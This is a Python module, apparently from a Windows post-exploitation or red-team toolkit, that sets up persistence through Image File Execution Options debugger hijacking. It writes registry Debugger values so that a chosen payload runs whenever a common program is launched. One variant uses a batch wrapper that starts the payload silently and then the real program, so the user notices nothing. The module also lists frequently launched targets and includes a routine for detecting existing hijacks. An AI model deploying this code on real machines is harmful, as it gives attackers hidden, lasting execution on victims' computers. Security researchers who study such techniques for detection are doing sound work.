"""
Image File Execution Options (IFEO) debugger hijacking
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_command, validate_payload_path, check_admin
from config import REGISTRY_PATHS, COMMON_IFEO_TARGETS


class IFEOPersistence:
    """Handles IFEO debugger hijacking persistence"""
    
    def __init__(self):
        self.is_admin = check_admin()
        self.ifeo_base_path = REGISTRY_PATHS['ifeo']
    
    def install(self, target_exe, payload_path):
        """
        Install persistence via IFEO debugger hijack
        Intercepts execution of target executable
        
        Args:
            target_exe (str): Target executable to hijack (e.g., 'notepad.exe')
            payload_path (str): Path to payload (debugger)
            
        Returns:
            dict: Installation result with removal command
        """
        print(f"[*] Installing IFEO debugger hijack for {target_exe}...")
        
        if not self.is_admin:
            print("[!] This method requires administrator privileges")
            print("    IFEO modifications require elevated access")
            return None
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Ensure target_exe has .exe extension
        if not target_exe.lower().endswith('.exe'):
            target_exe += '.exe'
        
        # Full registry path for this target
        reg_path = f"{self.ifeo_base_path}\\{target_exe}"
        
        print(f"[*] Target: {target_exe}")
        print(f"[*] Registry: {reg_path}")
        print(f"[!] WARNING: {target_exe} will NOT run normally after this!")
        print(f"[!] Instead, your payload will be executed when {target_exe} is launched")
        
        # Set debugger value
        command = f'reg add "{reg_path}" /v Debugger /t REG_SZ /d "{payload_path}" /f'
        result = run_command(command, require_admin=True)
        
        if result and result['success']:
            print(f"[+] Persistence installed successfully!")
            print(f"    Location: {reg_path}\\Debugger")
            print(f"    Target: {target_exe}")
            print(f"    Debugger: {payload_path}")
            print(f"    Trigger: Execution of {target_exe}")
            print(f"    Admin Required: Yes")
            print(f"    Detection: Medium difficulty")
            print(f"\n[!] IMPORTANT: {target_exe} will not function normally!")
            print(f"[!] Remove persistence to restore normal operation")
            
            return {
                'method': 'image_file_execution',
                'path': reg_path,
                'target': target_exe,
                'payload': payload_path,
                'requires_admin': True,
                'breaks_target': True,
                'remove_command': f'reg delete "{reg_path}" /f'
            }
        else:
            print(f"[-] Failed to install persistence")
            if result:
                print(f"    Error: {result.get('stderr', 'Unknown error')}")
            return None
    
    def install_with_wrapper(self, target_exe, payload_path):
        """
        Install IFEO hijack with wrapper that still executes target
        This allows the target to function while also executing payload
        
        Args:
            target_exe (str): Target executable to hijack
            payload_path (str): Path to payload
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Installing IFEO hijack with wrapper for {target_exe}...")
        print("[*] This method executes payload then launches the real target")
        
        if not self.is_admin:
            print("[!] This method requires administrator privileges")
            return None
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Ensure target_exe has .exe extension
        if not target_exe.lower().endswith('.exe'):
            target_exe += '.exe'
        
        # Create wrapper script that runs payload then target
        wrapper_name = f"wrapper_{target_exe.replace('.exe', '')}.bat"
        wrapper_path = os.path.join(r"C:\Windows\Temp", wrapper_name)
        
        # Find target executable path (common locations)
        target_locations = [
            rf"C:\Windows\System32\{target_exe}",
            rf"C:\Windows\{target_exe}",
            rf"C:\Program Files\{target_exe}"
        ]
        
        wrapper_content = f'''@echo off
REM Execute payload
start /b "" "{payload_path}"

REM Execute real target
'''
        
        # Add attempts to find and run real target
        for location in target_locations:
            wrapper_content += f'if exist "{location}" start "" "{location}" %* & exit\n'
        
        try:
            with open(wrapper_path, 'w') as f:
                f.write(wrapper_content)
            
            print(f"[+] Wrapper created: {wrapper_path}")
            
            # Set wrapper as debugger
            reg_path = f"{self.ifeo_base_path}\\{target_exe}"
            command = f'reg add "{reg_path}" /v Debugger /t REG_SZ /d "{wrapper_path}" /f'
            result = run_command(command, require_admin=True)
            
            if result and result['success']:
                print(f"[+] Persistence installed successfully!")
                print(f"    Location: {reg_path}\\Debugger")
                print(f"    Target: {target_exe}")
                print(f"    Wrapper: {wrapper_path}")
                print(f"    Payload: {payload_path}")
                print(f"    Trigger: Execution of {target_exe}")
                print(f"    Target still works: Yes (via wrapper)")
                
                return {
                    'method': 'ifeo_with_wrapper',
                    'path': reg_path,
                    'target': target_exe,
                    'wrapper': wrapper_path,
                    'payload': payload_path,
                    'requires_admin': True,
                    'breaks_target': False,
                    'remove_command': f'reg delete "{reg_path}" /f && del "{wrapper_path}"'
                }
            else:
                print(f"[-] Failed to install persistence")
                os.remove(wrapper_path)
                return None
                
        except Exception as e:
            print(f"[-] Error creating wrapper: {e}")
            return None
    
    def list_common_targets(self):
        """
        List common targets for IFEO hijacking
        
        Returns:
            list: Common target executables
        """
        print("\n[*] Common IFEO hijack targets:")
        print("    (Applications that users frequently launch)")
        print()
        
        for i, target in enumerate(COMMON_IFEO_TARGETS, 1):
            print(f"    {i}. {target}")
        
        return COMMON_IFEO_TARGETS
    
    def check_ifeo_hijacks(self):
        """
        Check for existing IFEO hijacks
        
        Returns:
            list: Found IFEO hijacks
        """
        print("[*] Checking for IFEO hijacks...")
        
        query_cmd = f'reg query "{self.ifeo_base_path}" /s /v Debugger'
        result = run_command(query_cmd, require_admin=True)
        
        if not result or not result['success']:
            print("[-] Failed to query IFEO registry")
            return []
        
        hijacks = []
        current_key = None
        
        for line in result['stdout'].split('\n'):
            if self.ifeo_base_path in line:
                current_key = line.strip()
            elif 'Debugger' in line and 'REG_SZ' in line:
                debugger = line.split('REG_SZ')[-1].strip()
                if current_key:
                    hijacks.append({
                        'key': current_key,
                        'debugger': debugger
                    })
        
        if hijacks:
            print(f"[+] Found {len(hijacks)} IFEO hijack(s):")
            for hijack in hijacks:
                print(f"    {hijack['key']}")
                print(f"      Debugger: {hijack['debugger']}")
        else:
            print("[*] No IFEO hijacks found")
        
        return hijacks